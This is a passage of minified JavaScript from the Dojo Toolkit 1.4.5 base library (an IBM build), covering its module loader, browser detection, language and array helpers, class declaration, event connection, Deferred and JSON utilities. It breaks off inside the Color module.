(function(){var _1=null,_78,_79,n,d,_30a,_34c,_4ce,_4cf,_4d0,_51b;if((_1||"undefined"!=typeof djConfig&&djConfig.scopeMap)&&"undefined"!=typeof window){var _2="",_3="",_4="",_5={},_6={};_1=_1||djConfig.scopeMap;for(var i=0;i<_1.length;i++){var _7=_1[i];_2+="var "+_7[0]+" = {}; "+_7[1]+" = "+_7[0]+";"+_7[1]+"._scopeName = '"+_7[1]+"';",_3+=(0==i?"":",")+_7[0],_4+=(0==i?"":",")+_7[1],_5[_7[0]]=_7[1],_6[_7[1]]=_7[0]}eval(_2+"dojo._scopeArgs = ["+_4+"];"),dojo._scopePrefixArgs=_3,dojo._scopePrefix="(function("+_3+"){",dojo._scopeSuffix="})("+_4+")",dojo._scopeMap=_5,dojo._scopeMapRev=_6}if(function(){if("function"==typeof this.loadFirebugConsole)this.loadFirebugConsole();else{this.console=this.console||{};for(var cn=["assert","count","debug","dir","dirxml","error","group","groupEnd","info","profile","profileEnd","time","timeEnd","trace","warn","log"],i=0,tn;tn=cn[i++];)console[tn]||function(){var e=tn+"";console[e]="log"in console?function(){var t=Array.apply({},arguments);t.unshift(e+":"),console.log(t.join(" "))}:function(){},console[e]._fake=!0}()}"undefined"==typeof dojo&&(dojo={_scopeName:"dojo",_scopePrefix:"",_scopePrefixArgs:"",_scopeSuffix:"",_scopeMap:{},_scopeMapRev:{}});var d=dojo;if("undefined"==typeof dijit&&(dijit={_scopeName:"dijit"}),"undefined"==typeof dojox&&(dojox={_scopeName:"dojox"}),d._scopeArgs||(d._scopeArgs=[dojo,dijit,dojox]),d.global=this,d.config={isDebug:!1,debugAtAllCosts:!1},"undefined"!=typeof djConfig)for(var _9 in djConfig)d.config[_9]=djConfig[_9];dojo.locale=d.config.locale;var _a="$Rev 55a5c39 $".match(/[0-9a-f]{7,}/);dojo.version={major:1,minor:4,patch:5,flag:"_IBM",revision:_a?_a[0]:NaN,toString:function(){with(d.version)return major+"."+minor+"."+patch+flag+" ("+revision+")"}},"undefined"!=typeof OpenAjax&&OpenAjax.hub.registerLibrary(dojo._scopeName,"http://dojotoolkit.org",d.version.toString());var _b,_c,_d={};for(var i in{toString:1}){_b=[];break}dojo._extraNames=_b=_b||["hasOwnProperty","valueOf","isPrototypeOf","propertyIsEnumerable","toLocaleString","toString","constructor"],_c=_b.length,dojo._mixin=function(e,t){var o,r,n;for(o in t)r=t[o],o in e&&(e[o]===r||o in _d&&_d[o]===r)||(e[o]=r);if(_c&&t)for(n=0;n<_c;++n)r=t[o=_b[n]],o in e&&(e[o]===r||o in _d&&_d[o]===r)||(e[o]=r);return e},dojo.mixin=function(e,t){e||(e={});for(var o=1,r=arguments.length;o<r;o++)d._mixin(e,arguments[o]);return e},dojo._getProp=function(e,t,o){for(var r,n=o||d.global,i=0;n&&(r=e[i]);i++)0==i&&d._scopeMap[r]&&(r=d._scopeMap[r]),n=r in n?n[r]:t?n[r]={}:void 0;return n},dojo.setObject=function(e,t,o){var r=e.split("."),n=r.pop(),i=d._getProp(r,!0,o);return i&&n?i[n]=t:void 0},dojo.getObject=function(e,t,o){return d._getProp(e.split("."),t,o)},dojo.exists=function(e,t){return!!d.getObject(e,!1,t)},dojo.eval=function(_1d){return d.global.eval?d.global.eval(_1d):eval(_1d)},d.deprecated=d.experimental=function(){}}(),function(){var e=dojo;e.mixin(e,{_loadedModules:{},_inFlightCount:0,_hasResource:{},_modulePrefixes:{dojo:{name:"dojo",value:"."},doh:{name:"doh",value:"../util/doh"},tests:{name:"tests",value:"tests"}},_moduleHasPrefix:function(t){var o=e._modulePrefixes;return!(!o[t]||!o[t].value)},_getModulePrefix:function(t){var o=e._modulePrefixes;return e._moduleHasPrefix(t)?o[t].value:t},_loadedUrls:[],_postLoad:!1,_loaders:[],_unloaders:[],_loadNotifying:!1}),dojo._loadPath=function(t,o,r){var n=("/"==t.charAt(0)||t.match(/^\w+:/)?"":e.baseUrl)+t;try{return o?e._loadUriAndCheck(n,o,r):e._loadUri(n,r)}catch(e){return console.error(e),!1}},dojo._loadUri=function(t,o){if(e._loadedUrls[t])return!0;e._inFlightCount++;var r=e._getText(t,!0);if(r){e._loadedUrls[t]=!0,e._loadedUrls.push(t),r=o?"("+r+")":e._scopePrefix+r+e._scopeSuffix,e.isIE||(r+="\r\n//@ sourceURL="+t);var n=e.eval(r);o&&o(n)}return 0==--e._inFlightCount&&e._postLoad&&e._loaders.length&&setTimeout((function(){0==e._inFlightCount&&e._callLoaded()}),0),!!r},dojo._loadUriAndCheck=function(t,o,r){var n=!1;try{n=e._loadUri(t,r)}catch(e){console.error("failed loading "+t+" with error: "+e)}return!(!n||!e._loadedModules[o])},dojo.loaded=function(){e._loadNotifying=!0,e._postLoad=!0;var t=e._loaders;e._loaders=[];for(var o=0;o<t.length;o++)t[o]();e._loadNotifying=!1,e._postLoad&&0==e._inFlightCount&&t.length&&e._callLoaded()},dojo.unloaded=function(){for(var t=e._unloaders;t.length;)t.pop()()},e._onto=function(e,t,o){if(o){if(o){var r="string"==typeof o?t[o]:o;e.push((function(){r.call(t)}))}}else e.push(t)},dojo.ready=dojo.addOnLoad=function(t,o){e._onto(e._loaders,t,o),e._postLoad&&0==e._inFlightCount&&!e._loadNotifying&&e._callLoaded()};var t=e.config.addOnLoad;t&&e.addOnLoad[t instanceof Array?"apply":"call"](e,t),dojo._modulesLoaded=function(){e._postLoad||(e._inFlightCount>0?console.warn("files still in flight!"):e._callLoaded())},dojo._callLoaded=function(){"object"==typeof setTimeout||e.config.useXDomain&&e.isOpera?setTimeout(e.isAIR?function(){e.loaded()}:e._scopeName+".loaded();",0):e.loaded()},dojo._getModuleSymbols=function(t){for(var o=t.split("."),r=o.length;r>0;r--){var n=o.slice(0,r).join(".");if(1!=r||e._moduleHasPrefix(n)){var i=e._getModulePrefix(n);if(i!=n){o.splice(0,r,i);break}}else o[0]="../"+o[0]}return o},dojo._global_omit_module_check=!1,dojo.loadInit=function(e){e()},dojo._loadModule=dojo.require=function(t,o){o=e._global_omit_module_check||o;var r=e._loadedModules[t];if(r)return r;var n=e._getModuleSymbols(t).join("/")+".js",i=o?null:t;if(!e._loadPath(n,i)&&!o)throw new Error("Could not load '"+t+"'; last tried '"+n+"'");if(!o&&!e._isXDomain&&!(r=e._loadedModules[t]))throw new Error("symbol '"+t+"' is not defined after loading '"+n+"'");return r},dojo.provide=function(t){return t+="",e._loadedModules[t]=e.getObject(t,!0)},dojo.platformRequire=function(t){for(var o=(t.common||[]).concat(t[e._name]||t.default||[]),r=0;r<o.length;r++){var n=o[r];n.constructor==Array?e._loadModule.apply(e,n):e._loadModule(n)}},dojo.requireIf=function(t,o){if(!0===t){for(var r=[],n=1;n<arguments.length;n++)r.push(arguments[n]);e.require.apply(e,r)}},dojo.requireAfterIf=e.requireIf,dojo.registerModulePath=function(t,o){e._modulePrefixes[t]={name:t,value:o}},dojo.requireLocalization=function(t,o,r,n){e.require("dojo.i18n"),e.i18n._requireLocalization.apply(e.hostenv,arguments)};var o=new RegExp("^(([^:/?#]+):)?(//([^/?#]*))?([^?#]*)(\\?([^#]*))?(#(.*))?$"),r=new RegExp("^((([^\\[:]+):)?([^@]+)@)?(\\[([^\\]]+)\\]|([^\\[:]*))(:([0-9]+))?$");dojo._Url=function(){for(var t=null,n=arguments,i=[n[0]],a=1;a<n.length;a++)if(n[a]){var s=new e._Url(n[a]+""),l=new e._Url(i[0]+"");if(""!=s.path||s.scheme||s.authority||s.query){if(!s.scheme&&(s.scheme=l.scheme,!s.authority&&(s.authority=l.authority,"/"!=s.path.charAt(0)))){for(var d=(l.path.substring(0,l.path.lastIndexOf("/")+1)+s.path).split("/"),c=0;c<d.length;c++)"."==d[c]?c==d.length-1?d[c]="":(d.splice(c,1),c--):c>0&&(1!=c||""!=d[0])&&".."==d[c]&&".."!=d[c-1]&&(c==d.length-1?(d.splice(c,1),d[c-1]=""):(d.splice(c-1,2),c-=2));s.path=d.join("/")}}else s.fragment!=t&&(l.fragment=s.fragment),s=l;i=[],s.scheme&&i.push(s.scheme,":"),s.authority&&i.push("//",s.authority),i.push(s.path),s.query&&i.push("?",s.query),s.fragment&&i.push("#",s.fragment)}this.uri=i.join("");var u=this.uri.match(o);this.scheme=u[2]||(u[1]?"":t),this.authority=u[4]||(u[3]?"":t),this.path=u[5],this.query=u[7]||(u[6]?"":t),this.fragment=u[9]||(u[8]?"":t),this.authority!=t&&(u=this.authority.match(r),this.user=u[3]||t,this.password=u[4]||t,this.host=u[6]||u[7],this.port=u[9]||t)},dojo._Url.prototype.toString=function(){return this.uri},dojo.moduleUrl=function(t,o){var r=e._getModuleSymbols(t).join("/");if(!r)return null;r.lastIndexOf("/")!=r.length-1&&(r+="/");var n=r.indexOf(":");return"/"!=r.charAt(0)&&(-1==n||n>r.indexOf("/"))&&(r=e.baseUrl+r),new e._Url(r,o)}}(),"undefined"!=typeof window&&(dojo.isBrowser=!0,dojo._name="browser",function(){var d=dojo;if(document&&document.getElementsByTagName)for(var _46=document.getElementsByTagName("script"),_47=/dojo(\.xd)?\.js(\W|$)/i,i=0;i<_46.length;i++){var src=_46[i].getAttribute("src");if(src){var m=src.match(_47);if(m){d.config.baseUrl||(d.config.baseUrl=src.substring(0,m.index));var cfg=_46[i].getAttribute("djConfig");if(cfg){var _48=eval("({ "+cfg+" })");for(var x in _48)dojo.config[x]=_48[x]}break}}}d.baseUrl=d.config.baseUrl;var n=navigator,dua=n.userAgent,dav=n.appVersion,tv=parseFloat(dav);dua.indexOf("Opera")>=0&&(d.isOpera=tv),dua.indexOf("AdobeAIR")>=0&&(d.isAIR=1),d.isKhtml=dav.indexOf("Konqueror")>=0?tv:0,d.isWebKit=parseFloat(dua.split("WebKit/")[1])||void 0,d.isChrome=parseFloat(dua.split("Chrome/")[1])||void 0,d.isMac=dav.indexOf("Macintosh")>=0;var _49=Math.max(dav.indexOf("WebKit"),dav.indexOf("Safari"),0);if(_49&&!dojo.isChrome&&(d.isSafari=parseFloat(dav.split("Version/")[1]),(!d.isSafari||parseFloat(dav.substr(_49+7))<=419.3)&&(d.isSafari=2)),dua.indexOf("Gecko")>=0&&!d.isKhtml&&!d.isWebKit&&(d.isMozilla=d.isMoz=tv),d.isMoz&&(d.isFF=parseFloat(dua.split("Firefox/")[1]||dua.split("Minefield/")[1])||void 0),document.all&&!d.isOpera){d.isIE=parseFloat(dav.split("MSIE ")[1])||void 0;var _4a=document.documentMode;_4a&&5!=_4a&&Math.floor(d.isIE)!=_4a&&(d.isIE=_4a)}dojo.isIE&&"file:"===window.location.protocol&&(dojo.config.ieForceActiveXXhr=!0),d.isQuirks="BackCompat"==document.compatMode,d.locale=dojo.config.locale||(d.isIE?n.userLanguage:n.language).toLowerCase(),d._XMLHTTP_PROGIDS=["Msxml2.XMLHTTP","Microsoft.XMLHTTP","Msxml2.XMLHTTP.4.0"],d._xhrObj=function(){var e,t;if(!dojo.isIE||!dojo.config.ieForceActiveXXhr)try{e=new XMLHttpRequest}catch(e){}if(!e)for(var o=0;o<3;++o){var r=d._XMLHTTP_PROGIDS[o];try{e=new ActiveXObject(r)}catch(e){t=e}if(e){d._XMLHTTP_PROGIDS=[r];break}}if(!e)throw new Error("XMLHTTP not available: "+t);return e},d._isDocumentOk=function(e){var t=e.status||0,o=location.protocol;return t>=200&&t<300||304==t||1223==t||!t&&("file:"==o||"chrome:"==o||"app:"==o)};var _50=window.location+"",_51=document.getElementsByTagName("base"),_52=_51&&_51.length>0;d._getText=function(e,t){var o=d._xhrObj();!_52&&dojo._Url&&(e=new dojo._Url(_50,e).toString()),d.config.cacheBust&&(e+="",e+=(-1==e.indexOf("?")?"?":"&")+String(d.config.cacheBust).replace(/\W+/g,"")),o.open("GET",e,!1);try{if(o.send(null),!d._isDocumentOk(o)){var r=Error("Unable to load "+e+" status:"+o.status);throw r.status=o.status,r.responseText=o.responseText,r}}catch(e){if(t)return null;throw e}return o.responseText};var _55=window,_56=function(e,t){(_55.attachEvent||_55.addEventListener)(e=_55.attachEvent?e:e.substring(2),(function(){t.apply(_55,arguments)}),!1)};d._windowUnloaders=[],d.windowUnloaded=function(){for(var e=d._windowUnloaders;e.length;)e.pop()();d=null};var _59=0;d.addOnWindowUnload=function(e,t){d._onto(d._windowUnloaders,e,t),_59||(_59=1,_56("onunload",d.windowUnloaded))};var _5b=0;d.addOnUnload=function(e,t){d._onto(d._unloaders,e,t),_5b||(_5b=1,_56("onbeforeunload",dojo.unloaded))}}(),dojo._initFired=!1,dojo._loadInit=function(e){dojo._initFired||(dojo._initFired=!0,!dojo.config.afterOnLoad&&window.detachEvent&&window.detachEvent("onload",dojo._loadInit),0==dojo._inFlightCount&&dojo._modulesLoaded())},dojo.config.afterOnLoad||(document.addEventListener?(document.addEventListener("DOMContentLoaded",dojo._loadInit,!1),window.addEventListener("load",dojo._loadInit,!1)):window.attachEvent&&window.attachEvent("onload",dojo._loadInit)),dojo.isIE)){dojo.config.afterOnLoad||dojo.config.skipIeDomLoaded||document.write('<script defer src="//:" onreadystatechange="if(this.readyState==\'complete\'){'+dojo._scopeName+'._loadInit();}"><\/script>');try{document.namespaces.add("v","urn:schemas-microsoft-com:vml");var _5d=["*","group","roundrect","oval","shape","rect","imagedata","path","textpath","text"],i=0,l=1,s=document.createStyleSheet();for(dojo.isIE>=8&&(i=1,l=_5d.length);i<l;++i)s.addRule("v\\:"+_5d[i],"behavior:url(#default#VML); display:inline-block")}catch(e){}}if(function(){var e=dojo.config.modulePaths;if(e)for(var t in e)dojo.registerModulePath(t,e[t])}(),dojo.config.isDebug&&dojo.require("dojo._firebug.firebug"),dojo.config.debugAtAllCosts&&(dojo.config.useXDomain=!0,dojo.require("dojo._base._loader.loader_xd"),dojo.require("dojo._base._loader.loader_debug")),dojo._hasResource["dojo._base.lang"]||(dojo._hasResource["dojo._base.lang"]=!0,dojo.provide("dojo._base.lang"),function(){var e=dojo,t=Object.prototype.toString;dojo.isString=function(e){return"string"==typeof e||e instanceof String},dojo.isArray=function(e){return e&&(e instanceof Array||"array"==typeof e)},dojo.isFunction=function(e){return"[object Function]"===t.call(e)},dojo.isObject=function(t){return void 0!==t&&(null===t||"object"==typeof t||e.isArray(t)||e.isFunction(t))},dojo.isArrayLike=function(t){return t&&void 0!==t&&!e.isString(t)&&!e.isFunction(t)&&!(t.tagName&&"form"==t.tagName.toLowerCase())&&(e.isArray(t)||isFinite(t.length))},dojo.isAlien=function(t){return t&&!e.isFunction(t)&&/\{\s*\[native code\]\s*\}/.test(String(t))},dojo.extend=function(t,o){for(var r=1,n=arguments.length;r<n;r++)e._mixin(t.prototype,arguments[r]);return t},dojo._hitchArgs=function(t,o){var r=e._toArray(arguments,2),n=e.isString(o);return function(){var i=e._toArray(arguments),a=n?(t||e.global)[o]:o;return a&&a.apply(t||this,r.concat(i))}},dojo.hitch=function(t,o){if(arguments.length>2)return e._hitchArgs.apply(e,arguments);if(o||(o=t,t=null),e.isString(o)){if(!(t=t||e.global)[o])throw['dojo.hitch: scope["',o,'"] is null (scope="',t,'")'].join("");return function(){return t[o].apply(t,arguments||[])}}return t?function(){return o.apply(t,arguments||[])}:o},dojo.delegate=dojo._delegate=function(){function t(){}return function(o,r){t.prototype=o;var n=new t;return t.prototype=null,r&&e._mixin(n,r),n}}();var o=function(e,t,o){return(o||[]).concat(Array.prototype.slice.call(e,t||0))},r=function(e,t,o){for(var r=o||[],n=t||0;n<e.length;n++)r.push(e[n]);return r};dojo._toArray=e.isIE?function(e){return(e.item?r:o).apply(this,arguments)}:o,dojo.partial=function(t){return e.hitch.apply(e,[null].concat(e._toArray(arguments)))};var n=e._extraNames,i=n.length,a={};dojo.clone=function(t){if(!t||"object"!=typeof t||e.isFunction(t))return t;if(t.nodeType&&"cloneNode"in t)return t.cloneNode(!0);if(t instanceof Date)return new Date(t.getTime());var o,r,s,l,d;if(e.isArray(t))for(o=[],r=0,s=t.length;r<s;++r)r in t&&o.push(e.clone(t[r]));else o=t.constructor?new t.constructor:{};for(d in t)l=t[d],d in o&&(o[d]===l||d in a&&a[d]===l)||(o[d]=e.clone(l));if(i)for(r=0;r<i;++r)l=t[d=n[r]],d in o&&(o[d]===l||d in a&&a[d]===l)||(o[d]=l);return o},dojo.trim=String.prototype.trim?function(e){return e.trim()}:function(e){return e.replace(/^\s\s*/,"").replace(/\s\s*$/,"")};var s=/\{([^\}]+)\}/g;dojo.replace=function(t,o,r){return t.replace(r||s,e.isFunction(o)?o:function(t,r){return e.getObject(r,!1,o)})}}()),dojo._hasResource["dojo._base.array"]||(dojo._hasResource["dojo._base.array"]=!0,dojo.provide("dojo._base.array"),_78=function(e,t,o){return["string"==typeof e?e.split(""):e,t||dojo.global,"string"==typeof o?new Function("item","index","array",o):o]},_79=function(e,t,o,r){for(var n=_78(t,r,o),i=0,a=(t=n[0]).length;i<a;++i){var s=!!n[2].call(n[1],t[i],i,t);if(e^s)return s}return e},dojo.mixin(dojo,{indexOf:function(e,t,o,r){var n=1,i=e.length||0,a=0;if(r&&(a=i-1,n=i=-1),null!=o&&(a=o),r&&a>i||a<i)for(;a!=i;a+=n)if(e[a]==t)return a;return-1},lastIndexOf:function(e,t,o){return dojo.indexOf(e,t,o,!0)},forEach:function(e,t,o){if(e&&e.length)for(var r=_78(e,o,t),n=0,i=(e=r[0]).length;n<i;++n)r[2].call(r[1],e[n],n,e)},every:function(e,t,o){return _79(!0,e,t,o)},some:function(e,t,o){return _79(!1,e,t,o)},map:function(e,t,o){var r=_78(e,o,t);e=r[0];for(var n=arguments[3]?new arguments[3]:[],i=0,a=e.length;i<a;++i)n.push(r[2].call(r[1],e[i],i,e));return n},filter:function(e,t,o){for(var r=_78(e,o,t),n=[],i=0,a=(e=r[0]).length;i<a;++i)r[2].call(r[1],e[i],i,e)&&n.push(e[i]);return n}})),dojo._hasResource["dojo._base.declare"]||(dojo._hasResource["dojo._base.declare"]=!0,dojo.provide("dojo._base.declare"),function(){var e=dojo,t=e._mixin,o=Object.prototype,r=o.toString,n=new Function,i=0,a="constructor";function s(e){throw new Error("declare: "+e)}function l(e,t,r){var n,i,l,d,c,u,h,p,m,f=this._inherited=this._inherited||{};if("string"==typeof e&&(n=e,e=t,t=r),r=0,d=e.callee,(n=n||d.nom)||s("can't deduce a name to call inherited()"),l=(c=this.constructor._meta).bases,m=f.p,n!=a){if(f.c!==d&&(m=0,(c=(u=l[0])._meta).hidden[n]!==d)){(i=c.chains)&&"string"==typeof i[n]&&s("calling chained method with inherited: "+n);do{if(c=u._meta,h=u.prototype,c&&(h[n]===d&&h.hasOwnProperty(n)||c.hidden[n]===d))break}while(u=l[++m]);m=u?m:-1}if(u=l[++m])if(h=u.prototype,u._meta&&h.hasOwnProperty(n))r=h[n];else{p=o[n];do{if((r=(h=u.prototype)[n])&&(u._meta?h.hasOwnProperty(n):r!==p))break}while(u=l[++m])}r=u&&r||o[n]}else{if(f.c!==d&&(m=0,(c=l[0]._meta)&&c.ctor!==d)){for((i=c.chains)&&"manual"===i.constructor||s("calling chained constructor with inherited");(u=l[++m])&&(!(c=u._meta)||c.ctor!==d););m=u?m:-1}for(;(u=l[++m])&&!(r=(c=u._meta)?c.ctor:u););r=u&&r}if(f.c=r,f.p=m,r)return!0===t?r:r.apply(this,t||e)}function d(e,t){return"string"==typeof e?this.inherited(e,t,!0):this.inherited(e,!0)}function c(e){for(var t=this.constructor._meta.bases,o=0,r=t.length;o<r;++o)if(t[o]===e)return!0;return this instanceof e}function u(t,n){var i,s,l=0,d=e._extraNames.length;for(i in n)(s=n[i])===o[i]&&i in o||i==a||("[object Function]"==r.call(s)&&(s.nom=i),t[i]=s);for(;l<d;++l)(s=n[i=e._extraNames[l]])===o[i]&&i in o||i==a||("[object Function]"==r.call(s)&&(s.nom=i),t[i]=s);return t}function h(e){return u(this.prototype,e),this}function p(e,t,o){return function(){var r,n,i,a=0,s=1;for(o&&(a=t.length-1,s=-1);r=t[a];a+=s)(i=((n=r._meta)?n.hidden:r.prototype)[e])&&i.apply(this,arguments)}}e.declare=function(f,g,b){var v,_,x,j,y,w,E,S,A,P,R,T,O=1,C=g;if("string"!=typeof f&&(b=g,g=f,f=""),b=b||{},"[object Array]"==r.call(g)?(w=function(e){for(var t,o,r,n,a,l,d,c,u=[],h=[{cls:0,refs:[]}],p={},m=1,f=e.length,g=0;g<f;++g){for((r=e[g])||s("mixin #"+g+" is null"),n=0,t=(o=r._meta?r._meta.bases:[r]).length-1;t>=0;--t)(a=o[t].prototype).hasOwnProperty("declaredClass")||(a.declaredClass="uniqName_"+i++),d=a.declaredClass,p.hasOwnProperty(d)||(p[d]={count:0,refs:[],cls:o[t]},++m),l=p[d],n&&n!==l&&(l.refs.push(n),++n.count),n=l;++n.count,h[0].refs.push(n)}for(;h.length;){for(n=h.pop(),u.push(n.cls),--m;1==(c=n.refs).length;){if(!(n=c[0])||--n.count){n=0;break}u.push(n.cls),--m}if(n)for(g=0,f=c.length;g<f;++g)--(n=c[g]).count||h.push(n)}return m&&s("can't build consistent linearization"),r=e[0],u[0]=r?r._meta&&r===u[u.length-r._meta.bases.length]?r._meta.bases.length:1:0,u}(g),x=w[0],g=w[O=w.length-x]):(w=[0],g&&(x=g._meta,w=w.concat(x?x.bases:g))),g)for(_=O-1;n.prototype=g.prototype,v=new n,_;--_)x=w[_],t(v,x._meta?x._meta.hidden:x.prototype),(j=new Function).superclass=g,j.prototype=v,g=v.constructor=j;else v={};for(u(v,b),(x=b.constructor)!==o.constructor&&(x.nom=a,v.constructor=x),n.prototype=0,_=O-1;_;--_)(x=w[_]._meta)&&x.chains&&(E=t(E||{},x.chains));if(v["-chains-"]&&(E=t(E||{},v["-chains-"])),x=!E||!E.hasOwnProperty(a),w[0]=j=E&&"manual"===E.constructor?(T=w,function(){for(var e,t=arguments,o=0;e=T[o];++o)if(m=e._meta,e=m?m.ctor:e){e.apply(this,t);break}(e=this.postscript)&&e.apply(this,t)}):1==w.length?(P=b.constructor,R=x,function(){var e,t=arguments,o=t,r=t[0];R&&(r&&(e=r.preamble)&&(o=e.apply(this,o)||o),(e=this.preamble)&&e.apply(this,o)),P&&P.apply(this,t),(e=this.postscript)&&e.apply(this,t)}):(S=w,A=x,function(){var e,t,o,r,n=arguments,i=n,a=n[0],s=S.length;if(A&&(a&&a.preamble||this.preamble))for((r=new Array(S.length))[0]=n,t=0;(a=n[0])&&(e=a.preamble)&&(n=e.apply(this,n)||n),(e=(e=S[t].prototype).hasOwnProperty("preamble")&&e.preamble)&&(n=e.apply(this,n)||n),++t!=s;)r[t]=n;for(t=s-1;t>=0;--t)(e=(o=(e=S[t])._meta)?o.ctor:e)&&e.apply(this,r?r[t]:n);(e=this.postscript)&&e.apply(this,i)}),j._meta={bases:w,hidden:b,chains:E,parents:C,ctor:b.constructor},j.superclass=g&&g.prototype,j.extend=h,j.prototype=v,v.constructor=j,v.getInherited=d,v.inherited=l,v.isInstanceOf=c,f&&(v.declaredClass=f,e.setObject(f,j)),E)for(y in E)v[y]&&"string"==typeof E[y]&&y!=a&&((x=v[y]=p(y,w,"after"===E[y])).nom=y);return j},e.safeMixin=u}()),dojo._hasResource["dojo._base.connect"]||(dojo._hasResource["dojo._base.connect"]=!0,dojo.provide("dojo._base.connect"),dojo._listener={getDispatcher:function(){return function(){var e,t=Array.prototype,o=arguments.callee,r=o._listeners,n=o.target,i=n&&n.apply(this,arguments);for(var a in e=[].concat(r))a in t||e[a].apply(this,arguments);return i}},add:function(e,t,o){var r=(e=e||dojo.global)[t];if(!r||!r._listeners){var n=dojo._listener.getDispatcher();n.target=r,n._listeners=[],r=e[t]=n}return r._listeners.push(o)},remove:function(e,t,o){var r=(e||dojo.global)[t];r&&r._listeners&&o--&&delete r._listeners[o]}},dojo.connect=function(e,t,o,r,n){var i=arguments,a=[],s=0;a.push(dojo.isString(i[0])?null:i[s++],i[s++]);var l=i[s+1];a.push(dojo.isString(l)||dojo.isFunction(l)?i[s++]:null,i[s++]);for(var d=i.length;s<d;s++)a.push(i[s]);return dojo._connect.apply(this,a)},dojo._connect=function(e,t,o,r){var n=dojo._listener;return[e,t,n.add(e,t,dojo.hitch(o,r)),n]},dojo.disconnect=function(e){e&&void 0!==e[0]&&(dojo._disconnect.apply(this,e),delete e[0])},dojo._disconnect=function(e,t,o,r){r.remove(e,t,o)},dojo._topics={},dojo.subscribe=function(e,t,o){return[e,dojo._listener.add(dojo._topics,e,dojo.hitch(t,o))]},dojo.unsubscribe=function(e){e&&dojo._listener.remove(dojo._topics,e[0],e[1])},dojo.publish=function(e,t){var o=dojo._topics[e];o&&o.apply(this,t||[])},dojo.connectPublisher=function(e,t,o){var r=function(){dojo.publish(e,arguments)};return o?dojo.connect(t,o,r):dojo.connect(t,r)}),dojo._hasResource["dojo._base.Deferred"]||(dojo._hasResource["dojo._base.Deferred"]=!0,dojo.provide("dojo._base.Deferred"),dojo.Deferred=function(e){this.chain=[],this.id=this._nextId(),this.fired=-1,this.paused=0,this.results=[null,null],this.canceller=e,this.silentlyCancelled=!1,this.isFiring=!1},dojo.extend(dojo.Deferred,{_nextId:(n=1,function(){return n++}),cancel:function(){var e;if(-1==this.fired){if(this.canceller?e=this.canceller(this):this.silentlyCancelled=!0,-1==this.fired){if(!(e instanceof Error)){var t=e,o="Deferred Cancelled";e&&e.toString&&(o+=": "+e.toString()),(e=new Error(o)).dojoType="cancel",e.cancelResult=t}this.errback(e)}}else 0==this.fired&&this.results[0]instanceof dojo.Deferred&&this.results[0].cancel()},_resback:function(e){this.fired=e instanceof Error?1:0,this.results[this.fired]=e,this._fire()},_check:function(){if(-1==this.fired);else{if(!this.silentlyCancelled)throw new Error("already called!");this.silentlyCancelled=!1}},callback:function(e){this._check(),this._resback(e)},errback:function(e){this._check(),e instanceof Error||(e=new Error(e)),this._resback(e)},addBoth:function(e,t){var o=dojo.hitch.apply(dojo,arguments);return this.addCallbacks(o,o)},addCallback:function(e,t){return this.addCallbacks(dojo.hitch.apply(dojo,arguments))},addErrback:function(e,t){return this.addCallbacks(null,dojo.hitch.apply(dojo,arguments))},addCallbacks:function(e,t){return this.chain.push([e,t]),this.fired>=0&&!this.isFiring&&this._fire(),this},_fire:function(){this.isFiring=!0;for(var e=this.chain,t=this.fired,o=this.results[t],r=this,n=null;e.length>0&&0==this.paused;){var i=e.shift()[t];if(i){var a=function(){var e=i(o);void 0!==e&&(o=e),t=o instanceof Error?1:0,o instanceof dojo.Deferred&&(n=function(e){r._resback(e),r.paused--,0==r.paused&&r.fired>=0&&r._fire()},this.paused++)};if(dojo.config.debugAtAllCosts)a.call(this);else try{a.call(this)}catch(e){t=1,o=e}}}this.fired=t,this.results[t]=o,this.isFiring=!1,n&&this.paused&&o.addBoth(n)}})),dojo._hasResource["dojo._base.json"]||(dojo._hasResource["dojo._base.json"]=!0,dojo.provide("dojo._base.json"),dojo.fromJson=function(_eb){return eval("("+_eb+")")},dojo._escapeString=function(e){return('"'+e.replace(/(["\\])/g,"\\$1")+'"').replace(/[\f]/g,"\\f").replace(/[\b]/g,"\\b").replace(/[\n]/g,"\\n").replace(/[\t]/g,"\\t").replace(/[\r]/g,"\\r")},dojo.toJsonIndentStr="\t",dojo.toJson=function(e,t,o){if(void 0===e)return"undefined";var r=typeof e;if("number"==r||"boolean"==r)return e+"";if(null===e)return"null";if(dojo.isString(e))return dojo._escapeString(e);var n,i=arguments.callee;o=o||"";var a=t?o+dojo.toJsonIndentStr:"",s=e.__json__||e.json;if(dojo.isFunction(s)&&e!==(n=s.call(e)))return i(n,t,a);if(e.nodeType&&e.cloneNode)throw new Error("Can't serialize DOM nodes");var l=t?" ":"",d=t?"\n":"";if(dojo.isArray(e)){var c=dojo.map(e,(function(e){var o=i(e,t,a);return"string"!=typeof o&&(o="undefined"),d+a+o}));return"["+c.join(","+l)+d+o+"]"}if("function"==r)return null;var u,h=[];for(u in e){var p,m;if("number"==typeof u)p='"'+u+'"';else{if("string"!=typeof u)continue;p=dojo._escapeString(u)}"string"==typeof(m=i(e[u],t,a))&&h.push(d+a+p+":"+l+m)}return"{"+h.join(","+l)+d+o+"}"}),dojo._hasResource["dojo._base.Color"]||(dojo._hasResource["dojo._base.Color"]=!0,dojo.provide("dojo._base.Color"),d=dojo,dojo.Color=function(e){e&&this.setColor(e)},dojo.Color.named={black:[0,0,0],silver:[192,192,192],gray:[128,128,128],white:[255,255,255],maroon:[128,0,0],red:[255,0,0],purple:[128,0,128],fuchsia:[255,0,255],green:[0,128,0],lime:[0,255,0],olive:[128,128,0],yellow:[255,255,0],navy:[0,0,128],blue:[0,0,255],teal:[0,128,128],aqua:[0,255,255],transparent:d.config.transparentColor||[255,255,255]},dojo.extend(dojo.Color,{r:255,g:255,b:255,a:1,_set:function(e,t,o,r){var n=this;n.r=e,n.g=t,n.b=o,n.a=r},setColor:function(e){return d.isString(e)?d.colorFromString(e,this):d.isArray(e)?d.colorFromArray(e,this):(this._set(e.r,e.g,e.b,e.a),e instanceof d.Color||this.sanitize()),this},sanitize:function(){return this},toRgb:function(){var e=this;return[e.r,e.g,e.b]},toRgba:function(){var e=this;return[e.r,e.g,e.b,e.a]},toHex:function(){var e=d.map(["r","g","b"],(function(e){var t=this[e].toString(16);return t.length<2?"0"+t:t}),this);return"#"+e.join("")},toCss:function(e){var t=this,o=t.r+", "+t.g+", "+t.b;return(e?"rgba("+o+", "+t.a:"rgb("+o)+")"},toString:function(){return this.toCss(!0)}}),dojo.blendColors=function(e,t,o,r){var n=r||new d.Color;return d.forEach(["r","g","b","a"],(function(r){n[r]=e[r]+(t[r]-e[r])*o,"a"!=r&&(n[r]=Math.round(n[r]))})),n.sanitize()},dojo.colorFromRgb=function(e,t){var 